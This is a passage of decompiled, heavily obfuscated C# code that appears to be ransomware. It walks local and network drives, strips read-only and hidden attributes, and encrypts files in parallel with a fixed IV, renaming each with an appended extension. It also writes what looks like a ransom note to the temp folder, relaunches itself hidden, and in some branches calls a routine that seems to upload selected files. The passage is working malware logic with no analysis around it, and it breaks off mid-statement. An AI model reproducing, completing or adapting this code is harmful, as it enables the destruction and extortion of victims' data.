		avwQPvqZWjHd(getString_0(107396378), UJcPFgFtVJhWf(getString_0(107398304)));
		string text = UJcPFgFtVJhWf(getString_0(107398622));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107400308) + text + getString_0(107400308) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107396378);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void wvGfPUgIYOBF(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (SWaMdrdKGgzowGl)
			{
				try
				{
					File.AppendAllText(bDDJFCkjBbYQ, getString_0(107398557) + string_0 + getString_0(107398548) + ex.Message + getString_0(107396639));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string MVOTvzaISsBSX()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107401576);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107397947);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107398002))) ? getString_0(107397952) : getString_0(107397993));
				break;
			case 0:
				text = getString_0(107397975);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107397942);
				break;
			case 4:
				text = getString_0(107397961);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107397911) : getString_0(107397920));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107397887) : getString_0(107397924)) : getString_0(107397929)) : getString_0(107397938));
				break;
			case 10:
				text = getString_0(107397882);
				break;
			}
		}
		if (text != getString_0(107401576))
		{
			text = getString_0(107397877) + text;
			if (oSVersion.ServicePack != getString_0(107401576))
			{
				text = text + getString_0(107399925) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string KHFqolIuXSJb(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395232);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(UJcPFgFtVJhWf(getString_0(107395199)));
				streamWriter.WriteLine(getString_0(107396639));
				streamWriter.WriteLine(UJcPFgFtVJhWf(getString_0(107390501)));
				streamWriter.WriteLine(string_0);
				if (OtvlrYHFRq)
				{
					streamWriter.WriteLine(getString_0(107396639));
					streamWriter.WriteLine(UJcPFgFtVJhWf(getString_0(107390359)));
					streamWriter.WriteLine(hIHAEKpEeiS.TMqqKWTFyQVhVGLF());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !UpNccIaFzBadyA)
				{
					File.AppendAllText(text, getString_0(107390326) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (SWaMdrdKGgzowGl)
			{
				try
				{
					File.AppendAllText(bDDJFCkjBbYQ, getString_0(107397896) + ex.Message + getString_0(107396639));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void RSpexIalouCsK(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		wZZkvUzPbJZ.pUBeQnAwpeWA CS_0024_003C_003E8__locals0 = new wZZkvUzPbJZ();
		CS_0024_003C_003E8__locals0.CqITlEjkWXnTK = string_1;
		CS_0024_003C_003E8__locals0.aFwtZhkyhonxJx = string_2;
		CS_0024_003C_003E8__locals0.XXWrItZGjdyeN = string_3;
		CS_0024_003C_003E8__locals0.tNRwfpjZiNCOM = string_4;
		if (uBpdQdBJjeZ && !MVOTvzaISsBSX().Contains(getString_0(107397911)) && !MVOTvzaISsBSX().Contains(getString_0(107397839)))
		{
			UMnjxwgpXb.bOvTaWmvkFcFEHp();
		}
		nQCMwcWKyQk = Convert.FromBase64String(CS_0024_003C_003E8__locals0.XXWrItZGjdyeN);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107395863))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (!array[i].IsReady || array[i].DriveType == DriveType.CDRom)
					{
						continue;
					}
					if (array[i].DriveType == DriveType.Network)
					{
						try
						{
							string text = UDSFJoOCgB(array[i].Name);
							if (!string.IsNullOrEmpty(text) && !eaZULefnOUcJVI.Contains(text))
							{
								eaZULefnOUcJVI.Add(text);
							}
							else if (!eaZULefnOUcJVI.Contains(array[i].Name))
							{
								eaZULefnOUcJVI.Add(array[i].Name);
							}
						}
						catch (Exception)
						{
							if (!eaZULefnOUcJVI.Contains(array[i].Name))
							{
								eaZULefnOUcJVI.Add(array[i].Name);
							}
						}
					}
					else if (!eaZULefnOUcJVI.Contains(array[i].Name))
					{
						eaZULefnOUcJVI.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!eaZULefnOUcJVI.Contains(string_0[j]))
				{
					eaZULefnOUcJVI.Add(string_0[j]);
				}
			}
		}
		if (eaZULefnOUcJVI.Contains(UJcPFgFtVJhWf(getString_0(107397794))) && ThomocmQwcHBb == getString_0(107396872))
		{
			eaZULefnOUcJVI.Remove(UJcPFgFtVJhWf(getString_0(107397794)));
		}
		Parallel.ForEach(eaZULefnOUcJVI, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new wZZkvUzPbJZ.pUBeQnAwpeWA();
			CS_0024_003C_003E8__locals0.KleysBRYbRu = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.QHcameMEDyksqkWY = string_0;
			if (bTMUTlJGkGOO && !MVOTvzaISsBSX().Contains(wZZkvUzPbJZ.getString_0(107397923)) && !MVOTvzaISsBSX().Contains(wZZkvUzPbJZ.getString_0(107397851)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						ncfdWMoQFofP(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.QHcameMEDyksqkWY);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (gsXyoeFOorGZ == wZZkvUzPbJZ.getString_0(107396884))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					jPSSNOQFeXu(CS_0024_003C_003E8__locals0.QHcameMEDyksqkWY, CS_0024_003C_003E8__locals0.KleysBRYbRu.CqITlEjkWXnTK, CS_0024_003C_003E8__locals0.KleysBRYbRu.tNRwfpjZiNCOM, CS_0024_003C_003E8__locals0.KleysBRYbRu.aFwtZhkyhonxJx, CS_0024_003C_003E8__locals0.KleysBRYbRu.XXWrItZGjdyeN);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				jPSSNOQFeXu(CS_0024_003C_003E8__locals0.QHcameMEDyksqkWY, CS_0024_003C_003E8__locals0.CqITlEjkWXnTK, CS_0024_003C_003E8__locals0.tNRwfpjZiNCOM, CS_0024_003C_003E8__locals0.aFwtZhkyhonxJx, CS_0024_003C_003E8__locals0.XXWrItZGjdyeN);
			}
		});
	}

	public static void jPSSNOQFeXu(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107401576));
		List<string> list3 = list2;
		if (wWsTKhWTnA == getString_0(107397129))
		{
			if (EBZNaOLOtuSLZ == getString_0(107396872) && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && dAdGxCzjjI(string_0))
			{
				QTqFzVuqYImkGfR qTqFzVuqYImkGfR = null;
				try
				{
					qTqFzVuqYImkGfR = new QTqFzVuqYImkGfR(string_0.Replace(getString_0(107396730), getString_0(107401576)));
				}
				catch
				{
					list = yhEifRAsvjp(string_0, string_1, string_2, string_3, string_4);
					return;
				}
				try
				{
					fcCzxmopLHsganD(qTqFzVuqYImkGfR.ToArray().ToList(), string_1, string_2, string_3, string_4);
					return;
				}
				catch (Exception)
				{
					list = yhEifRAsvjp(string_0, string_1, string_2, string_3, string_4);
					return;
				}
			}
			list = yhEifRAsvjp(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = WfwjzXqMlnLKXBb.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0453;
					}
				}
				if ((sWPChGvxft == getString_0(107397129) && !item.EndsWith(text)) || JEkdiihxCoWf.Contains(item))
				{
					continue;
				}
				if (NgbDiBVJKDTW == getString_0(107396872))
				{
					try
					{
						if (gTLpLXyJzZQWL.MGCzqHggmAUsoR(item))
						{
							gTLpLXyJzZQWL.UibMaZyBJndO(item);
						}
					}
					catch
					{
					}
				}
				JEkdiihxCoWf.Add(item);
				if (!IDUZlSGaIfn.Contains(Path.GetDirectoryName(item)))
				{
					IDUZlSGaIfn.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (krdgQbbXWsBnkAs == getString_0(107396872) && fileStream.Length > Convert.ToInt32(bQealBkUmzhp) * 1024 * 1024 && !list3.Contains(text))
					{
						if (pRibgXhmfietto == getString_0(107396872))
						{
							foreach (string item2 in tnUDcbYyevrzGRJA)
							{
								if (item.ToLower().EndsWith(item2) && OGIisKmpnCtjYJtSZ == getString_0(107396872))
								{
									if (Convert.ToInt32(dKLzVpzOOKvyJbR) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											hIHAEKpEeiS.SRnkQsJyJfqDTNo(getString_0(107402137), getString_0(107402132), getString_0(107402151), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && OGIisKmpnCtjYJtSZ == getString_0(107397129))
								{
									try
									{
										hIHAEKpEeiS.SRnkQsJyJfqDTNo(getString_0(107402137), getString_0(107402132), getString_0(107402151), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = PsMAbAPGwNaiG.jZLDTviUrm(item, Convert.ToInt32(bQealBkUmzhp) * 1024 * 1024);
						byte[] ipZGIkDRDrXd = PsMAbAPGwNaiG.ddDsnuGdyRxS(byte_, Convert.FromBase64String(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						PsMAbAPGwNaiG.teuDisObNXw(item, ipZGIkDRDrXd);
						if (string_2 != getString_0(107397785))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107397785))
					{
						QcpcdaqzGiHI(item, item + string_2, nQCMwcWKyQk);
					}
					else
					{
						QcpcdaqzGiHI(item, item + getString_0(107397780), nQCMwcWKyQk);
					}
				}
				catch (Exception)
				{
				}
				IL_0453:;
			}
		}
	}

	public static void fcCzxmopLHsganD(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		MlhxfWYHvBPnrE.UgmkrRPmQyDLrq CS_0024_003C_003E8__locals0 = new MlhxfWYHvBPnrE();
		CS_0024_003C_003E8__locals0.aGPipPUJxaM = list_0;
		CS_0024_003C_003E8__locals0.NWwyysQYwQDK = string_1;
		CS_0024_003C_003E8__locals0.OyagJirLxGEcF = string_2;
		CS_0024_003C_003E8__locals0.OxsDDfqLEi = string_3;
		CS_0024_003C_003E8__locals0.pyrQmieHmmx = new List<string> { getString_0(107401576) };
		if (sWPChGvxft == getString_0(107397129))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.aGPipPUJxaM)
				{
					if (!item.Contains(MlhxfWYHvBPnrE.getString_0(107401052)) && !item.Contains(MlhxfWYHvBPnrE.getString_0(107401027)) && !item.Contains(MlhxfWYHvBPnrE.getString_0(107400994)) && !item.ToLower().Contains(MlhxfWYHvBPnrE.getString_0(107400945)) && !item.ToLower().Contains(MlhxfWYHvBPnrE.getString_0(107400964)) && !item.Contains(MlhxfWYHvBPnrE.getString_0(107400907)) && !item.Contains(MlhxfWYHvBPnrE.getString_0(107400886)) && !item.ToLower().Contains(MlhxfWYHvBPnrE.getString_0(107400873)) && !item.ToLower().Contains(MlhxfWYHvBPnrE.getString_0(107400892)) && !item.ToLower().Contains(MlhxfWYHvBPnrE.getString_0(107401335)) && !item.ToLower().Contains(MlhxfWYHvBPnrE.getString_0(107401326)) && !item.ToLower().Contains(MlhxfWYHvBPnrE.getString_0(107401341)) && !item.ToLower().Contains(MlhxfWYHvBPnrE.getString_0(107401315)) && !item.ToLower().Contains(MlhxfWYHvBPnrE.getString_0(107401262)) && !item.Contains(MlhxfWYHvBPnrE.getString_0(107401237)) && !item.Contains(MlhxfWYHvBPnrE.getString_0(107401252)) && !item.Contains(MlhxfWYHvBPnrE.getString_0(107401203)) && !item.Contains(MlhxfWYHvBPnrE.getString_0(107401218)) && !item.Contains(MlhxfWYHvBPnrE.getString_0(107401169)) && !item.Contains(MlhxfWYHvBPnrE.getString_0(107401184)) && !item.Contains(MlhxfWYHvBPnrE.getString_0(107401135)) && !item.Contains(MlhxfWYHvBPnrE.getString_0(107401150)) && !item.Contains(MlhxfWYHvBPnrE.getString_0(107401105)) && !item.Contains(MlhxfWYHvBPnrE.getString_0(107401116)) && !item.ToLower().Contains(MlhxfWYHvBPnrE.getString_0(107400559)) && !item.ToLower().Contains(MlhxfWYHvBPnrE.getString_0(107400578)) && !item.ToLower().Contains(MlhxfWYHvBPnrE.getString_0(107400529)) && !item.ToLower().Contains(MlhxfWYHvBPnrE.getString_0(107400544)) && !item.Contains(UJcPFgFtVJhWf(MlhxfWYHvBPnrE.getString_0(107400495))) && !item.Contains(MlhxfWYHvBPnrE.getString_0(107400470)) && !item.Contains(MlhxfWYHvBPnrE.getString_0(107396745)) && !item.Contains(MlhxfWYHvBPnrE.getString_0(107400457)) && !item.EndsWith(CS_0024_003C_003E8__locals0.NWwyysQYwQDK) && !item.EndsWith(MlhxfWYHvBPnrE.getString_0(107400432)) && !item.EndsWith(MlhxfWYHvBPnrE.getString_0(107400427)) && !item.EndsWith(MlhxfWYHvBPnrE.getString_0(107400454)) && !item.EndsWith(MlhxfWYHvBPnrE.getString_0(107400449)) && !item.Contains(MlhxfWYHvBPnrE.getString_0(107400444)) && !item.Contains(ZLERFztvScvXGTf) && !item.Contains(bDDJFCkjBbYQ) && !item.Contains(IKRtRLOSqagD))
					{
						if (CS_0024_003C_003E8__locals0.OyagJirLxGEcF.Length != 0)
						{
							string[] oyagJirLxGEcF2 = CS_0024_003C_003E8__locals0.OyagJirLxGEcF;
							int num2 = 0;
							while (num2 < oyagJirLxGEcF2.Length)
							{
								string value2 = oyagJirLxGEcF2[num2];
								if (!item.EndsWith(value2))
								{
									num2++;
									continue;
								}
								goto IL_0e93;
							}
						}
						try
						{
							if (item.EndsWith(CS_0024_003C_003E8__locals0.NWwyysQYwQDK))
							{
								goto IL_0e93;
							}
						}
						catch (Exception)
						{
							goto IL_0e93;
						}
						if (item.EndsWith(string_0) && !JEkdiihxCoWf.Contains(item))
						{
							if (NgbDiBVJKDTW == MlhxfWYHvBPnrE.getString_0(107396892))
							{
								try
								{
									if (gTLpLXyJzZQWL.MGCzqHggmAUsoR(item))
									{
										gTLpLXyJzZQWL.UibMaZyBJndO(item);
									}
								}
								catch
								{
								}
							}
							JEkdiihxCoWf.Add(item);
							if (!IDUZlSGaIfn.Contains(Path.GetDirectoryName(item)))
							{
								IDUZlSGaIfn.Add(Path.GetDirectoryName(item));
							}
							wvGfPUgIYOBF(item);
							try
							{
								new hBrzirNLAz().GKYsKpmSoqlXyDMz(item);
							}
							catch
							{
							}
							try
							{
								using FileStream fileStream2 = new FileStream(item, FileMode.Open, FileAccess.Write);
								if (!fileStream2.CanWrite)
								{
									try
									{
										if (SidumIOOlYmWUm)
										{
											Console.WriteLine(MlhxfWYHvBPnrE.getString_0(107349507) + item + MlhxfWYHvBPnrE.getString_0(107349430) + new FileInfo(item).Length + MlhxfWYHvBPnrE.getString_0(107349441));
											Console.WriteLine(MlhxfWYHvBPnrE.getString_0(107349432));
										}
									}
									catch
									{
									}
									avwQPvqZWjHd(UJcPFgFtVJhWf(MlhxfWYHvBPnrE.getString_0(107348783)), MlhxfWYHvBPnrE.getString_0(107400328) + item + MlhxfWYHvBPnrE.getString_0(107400328) + UJcPFgFtVJhWf(MlhxfWYHvBPnrE.getString_0(107348758)) + MlhxfWYHvBPnrE.getString_0(107400328) + Environment.UserName + MlhxfWYHvBPnrE.getString_0(107400328) + UJcPFgFtVJhWf(MlhxfWYHvBPnrE.getString_0(107348773)));
								}
							}
							catch (Exception ex18)
							{
								if (SWaMdrdKGgzowGl)
								{
									try
									{
										File.AppendAllText(bDDJFCkjBbYQ, MlhxfWYHvBPnrE.getString_0(107398577) + item + MlhxfWYHvBPnrE.getString_0(107348716) + ex18.Message + MlhxfWYHvBPnrE.getString_0(107396659));
									}
									catch (Exception)
									{
									}
								}
								continue;
							}
							try
							{
								try
								{
									if (new FileInfo(item).Length != 0L)
									{
										goto end_IL_0716;
									}
									goto end_IL_0716_2;
									end_IL_0716:;
								}
								catch (Exception ex20)
								{
									if (SWaMdrdKGgzowGl)
									{
										try
										{
											File.AppendAllText(bDDJFCkjBbYQ, MlhxfWYHvBPnrE.getString_0(107398577) + item + MlhxfWYHvBPnrE.getString_0(107348667) + ex20.Message + MlhxfWYHvBPnrE.getString_0(107396659));
										}
										catch (Exception)
										{
										}
									}
									ZzaknwGiCeEd++;
									goto end_IL_0716_2;
								}
								if (!(krdgQbbXWsBnkAs == MlhxfWYHvBPnrE.getString_0(107396892)) || new FileInfo(item).Length <= Convert.ToInt32(bQealBkUmzhp) * 1024 * 1024 || CS_0024_003C_003E8__locals0.pyrQmieHmmx.Contains(string_0))
								{
									if (OtvlrYHFRq)
									{
										CS_0024_003C_003E8__locals0.NWwyysQYwQDK = YgTmUCLcTtww + CS_0024_003C_003E8__locals0.NWwyysQYwQDK;
									}
									string text5 = mZOauVQEiJhty.EDDvgUfJeLkYZvyu(32);
									string text6 = MlhxfWYHvBPnrE.getString_0(107401596);
									text6 = (UpNccIaFzBadyA ? mZOauVQEiJhty.LLWNJpvtZdfwY() : MlhxfWYHvBPnrE.getString_0(107401596));
									string s3 = pIZzeIXAyyFSd.QFUlfCNJcrFHq(text5 + text6);
									byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
									if (CS_0024_003C_003E8__locals0.NWwyysQYwQDK != MlhxfWYHvBPnrE.getString_0(107397805))
									{
										if (!NbfRNVirWcO)
										{
											if (!UpNccIaFzBadyA)
											{
												QTDQnApWjFz(item, item + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, nQCMwcWKyQk);
											}
											else
											{
												QTDQnApWjFz(item, item + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, Convert.FromBase64String(text5));
											}
										}
										else
										{
											try
											{
												if (!UpNccIaFzBadyA)
												{
													elqAHaVgaqSN(item, item + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, nQCMwcWKyQk, Convert.FromBase64String(lXgIUpLgAi));
												}
												else
												{
													elqAHaVgaqSN(item, item + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, Convert.FromBase64String(text5), Convert.FromBase64String(text6));
												}
											}
											catch (Exception ex22)
											{
												if (SWaMdrdKGgzowGl)
												{
													try
													{
														File.AppendAllText(bDDJFCkjBbYQ, MlhxfWYHvBPnrE.getString_0(107398577) + item + MlhxfWYHvBPnrE.getString_0(107397823) + ex22.Message + MlhxfWYHvBPnrE.getString_0(107396659));
													}
													catch (Exception)
													{
													}
												}
												ZzaknwGiCeEd++;
												try
												{
													File.Move(item + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, item);
												}
												catch (Exception)
												{
												}
												goto end_IL_0716_2;
											}
										}
									}
									else if (!NbfRNVirWcO)
									{
										if (!UpNccIaFzBadyA)
										{
											QTDQnApWjFz(item, item + MlhxfWYHvBPnrE.getString_0(107397800), nQCMwcWKyQk);
										}
										else
										{
											QTDQnApWjFz(item, item + MlhxfWYHvBPnrE.getString_0(107397800), Convert.FromBase64String(text5));
										}
									}
									else
									{
										try
										{
											if (!UpNccIaFzBadyA)
											{
												elqAHaVgaqSN(item, item, nQCMwcWKyQk, Convert.FromBase64String(lXgIUpLgAi));
											}
											else
											{
												elqAHaVgaqSN(item, item, Convert.FromBase64String(text5), Convert.FromBase64String(text6));
											}
										}
										catch (Exception ex25)
										{
											if (SWaMdrdKGgzowGl)
											{
												try
												{
													File.AppendAllText(bDDJFCkjBbYQ, MlhxfWYHvBPnrE.getString_0(107398577) + item + MlhxfWYHvBPnrE.getString_0(107397823) + ex25.Message + MlhxfWYHvBPnrE.getString_0(107396659));
												}
												catch (Exception)
												{
												}
											}
											ZzaknwGiCeEd++;
											goto end_IL_0716_2;
										}
									}
									if (UpNccIaFzBadyA)
									{
										if (CS_0024_003C_003E8__locals0.NWwyysQYwQDK != MlhxfWYHvBPnrE.getString_0(107397805))
										{
											wTxBRYOuXVKuCY(item + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, bytes3);
										}
										else
										{
											wTxBRYOuXVKuCY(item, bytes3);
										}
									}
									goto IL_0e93;
								}
								CS_0024_003C_003E8__locals0 = new MlhxfWYHvBPnrE.tdXNNsWJFtDVWeIAq();
								CS_0024_003C_003E8__locals0.FBthsJRqPLob = CS_0024_003C_003E8__locals0;
								try
								{
									if (CS_0024_003C_003E8__locals0.NWwyysQYwQDK != MlhxfWYHvBPnrE.getString_0(107397805))
									{
										if (OtvlrYHFRq)
										{
											CS_0024_003C_003E8__locals0.NWwyysQYwQDK = YgTmUCLcTtww + CS_0024_003C_003E8__locals0.NWwyysQYwQDK;
										}
										File.Move(item, item + CS_0024_003C_003E8__locals0.NWwyysQYwQDK);
									}
								}
								catch (Exception ex27)
								{
									if (SWaMdrdKGgzowGl)
									{
										try
										{
											File.AppendAllText(bDDJFCkjBbYQ, MlhxfWYHvBPnrE.getString_0(107398577) + item + MlhxfWYHvBPnrE.getString_0(107349118) + ex27.Message + MlhxfWYHvBPnrE.getString_0(107396659));
										}
										catch (Exception)
										{
										}
									}
									ZzaknwGiCeEd++;
									goto end_IL_0716_2;
								}
								CS_0024_003C_003E8__locals0.XmJykDMKNMhzu = MlhxfWYHvBPnrE.getString_0(107401596);
								if (CS_0024_003C_003E8__locals0.NWwyysQYwQDK != MlhxfWYHvBPnrE.getString_0(107397805))
								{
									CS_0024_003C_003E8__locals0.XmJykDMKNMhzu = item + CS_0024_003C_003E8__locals0.NWwyysQYwQDK;
								}
								else
								{
									CS_0024_003C_003E8__locals0.XmJykDMKNMhzu = item;
								}
								if (pRibgXhmfietto == MlhxfWYHvBPnrE.getString_0(107396892))
								{
									Thread thread2 = new Thread((ThreadStart)delegate
									{
										foreach (string item2 in tnUDcbYyevrzGRJA)
										{
											if (CS_0024_003C_003E8__locals0.XmJykDMKNMhzu.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.FBthsJRqPLob.NWwyysQYwQDK) && OGIisKmpnCtjYJtSZ == MlhxfWYHvBPnrE.tdXNNsWJFtDVWeIAq.getString_0(107396895))
											{
												if (Convert.ToInt32(dKLzVpzOOKvyJbR) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.XmJykDMKNMhzu).Length)
												{
													try
													{
														hIHAEKpEeiS.SRnkQsJyJfqDTNo(MlhxfWYHvBPnrE.tdXNNsWJFtDVWeIAq.getString_0(107402160), MlhxfWYHvBPnrE.tdXNNsWJFtDVWeIAq.getString_0(107402155), MlhxfWYHvBPnrE.tdXNNsWJFtDVWeIAq.getString_0(107402174), CS_0024_003C_003E8__locals0.XmJykDMKNMhzu);
													}
													catch
													{
													}
												}
											}
											else if (CS_0024_003C_003E8__locals0.XmJykDMKNMhzu.ToLower().EndsWith(item2) && OGIisKmpnCtjYJtSZ == MlhxfWYHvBPnrE.tdXNNsWJFtDVWeIAq.getString_0(107397152))
											{
												try
												{
													hIHAEKpEeiS.SRnkQsJyJfqDTNo(MlhxfWYHvBPnrE.tdXNNsWJFtDVWeIAq.getString_0(107402160), MlhxfWYHvBPnrE.tdXNNsWJFtDVWeIAq.getString_0(107402155), MlhxfWYHvBPnrE.tdXNNsWJFtDVWeIAq.getString_0(107402174), CS_0024_003C_003E8__locals0.XmJykDMKNMhzu);
												}
												catch
												{
												}
											}
										}
									});
									thread2.Priority = ThreadPriority.Normal;
									thread2.IsBackground = false;
									thread2.Start();
								}
								string text7 = mZOauVQEiJhty.EDDvgUfJeLkYZvyu(32);
								string text8 = MlhxfWYHvBPnrE.getString_0(107401596);
								text8 = (UpNccIaFzBadyA ? mZOauVQEiJhty.LLWNJpvtZdfwY() : MlhxfWYHvBPnrE.getString_0(107401596));
								string s4 = pIZzeIXAyyFSd.QFUlfCNJcrFHq(text7 + text8);
								byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
								if (dhEsUcbXeBeyR == MlhxfWYHvBPnrE.getString_0(107397149))
								{
									byte[] array2 = null;
									byte[] byte_2 = PsMAbAPGwNaiG.jZLDTviUrm(CS_0024_003C_003E8__locals0.XmJykDMKNMhzu, Convert.ToInt32(bQealBkUmzhp) * 1024 * 1024);
									if (PsMAbAPGwNaiG.teuDisObNXw(ipZGIkDRDrXd: (!OTLCmOpFsMP) ? (UpNccIaFzBadyA ? PsMAbAPGwNaiG.ddDsnuGdyRxS(byte_2, Convert.FromBase64String(text7), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : PsMAbAPGwNaiG.ddDsnuGdyRxS(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.OxsDDfqLEi), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (UpNccIaFzBadyA ? mbmsUAuYimuL.UGIyKRILFxs(byte_2, Convert.FromBase64String(text7), Convert.FromBase64String(text8)) : mbmsUAuYimuL.UGIyKRILFxs(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.OxsDDfqLEi), Convert.FromBase64String(lXgIUpLgAi))), TTIkAHWRYFFqFLX: CS_0024_003C_003E8__locals0.XmJykDMKNMhzu, ecklbfBlPisB: bytes4))
									{
										goto IL_0e93;
									}
									try
									{
										File.Move(item + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, item);
									}
									catch (Exception)
									{
									}
								}
								else if (!UpNccIaFzBadyA)
								{
									if (kLhUdzwWYwiYO.vhbsEfgZLCUjss(CS_0024_003C_003E8__locals0.XmJykDMKNMhzu, bQealBkUmzhp, CS_0024_003C_003E8__locals0.OxsDDfqLEi, null, Convert.FromBase64String(lXgIUpLgAi)))
									{
										goto IL_0e93;
									}
									try
									{
										File.Move(item + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, item);
									}
									catch (Exception)
									{
									}
								}
								else
								{
									if (kLhUdzwWYwiYO.vhbsEfgZLCUjss(CS_0024_003C_003E8__locals0.XmJykDMKNMhzu, bQealBkUmzhp, text7, bytes4, Convert.FromBase64String(text8)))
									{
										goto IL_0e93;
									}
									try
									{
										File.Move(item + CS_0024_003C_003E8__locals0.NWwyysQYwQDK, item);
									}
									catch (Exception)
									{
									}
								}
								end_IL_0716_2:;
							}
							catch (Exception)
							{
								goto IL_0e93;
							}
						}
					}
					continue;
					IL_0e93:
					CS_0024_003C_003E8__locals0.aGPipPUJxaM.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.aGPipPUJxaM, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new MlhxfWYHvBPnrE.UgmkrRPmQyDLrq();
			CS_0024_003C_003E8__locals0.FBthsJRqPLob = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.tDwFwsGDrP = string_0;
			if (!CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(MlhxfWYHvBPnrE.getString_0(107401052)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(MlhxfWYHvBPnrE.getString_0(107401027)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(MlhxfWYHvBPnrE.getString_0(107400994)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(MlhxfWYHvBPnrE.getString_0(107400945)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(MlhxfWYHvBPnrE.getString_0(107400964)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(MlhxfWYHvBPnrE.getString_0(107400907)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(MlhxfWYHvBPnrE.getString_0(107400886)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(MlhxfWYHvBPnrE.getString_0(107400873)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(MlhxfWYHvBPnrE.getString_0(107400892)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(MlhxfWYHvBPnrE.getString_0(107401335)) 